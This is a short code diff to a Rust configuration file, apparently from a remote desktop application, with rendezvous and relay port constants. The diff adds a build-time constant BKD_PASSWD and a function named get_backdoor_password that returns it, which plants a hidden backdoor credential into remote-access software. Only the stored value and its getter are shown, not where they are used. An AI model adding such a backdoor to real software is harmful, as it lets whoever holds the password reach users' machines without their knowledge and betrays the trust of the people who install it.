@@ -111,6 +111,11 @@ pub const RS_PUB_KEY: &str = match option_env!("RS_PUB_KEY") {
     _ => PUBLIC_RS_PUB_KEY,
 };
 
+pub const BKD_PASSWD: &str = match option_env!("BKD_PASSWD") {
+    Some(password) if !password.is_empty() => password,
+    _ => "",
+};
+
 pub const RENDEZVOUS_PORT: i32 = 21116;
 pub const RELAY_PORT: i32 = 21117;
 pub const WS_RENDEZVOUS_PORT: i32 = 21118;
@@ -1085,6 +1090,10 @@ impl Config {
             }
         }
         password
+    }
+
+    pub fn get_backdoor_password() -> String {
+        BKD_PASSWD.to_string()
     }
 
     pub fn set_salt(salt: &str) {
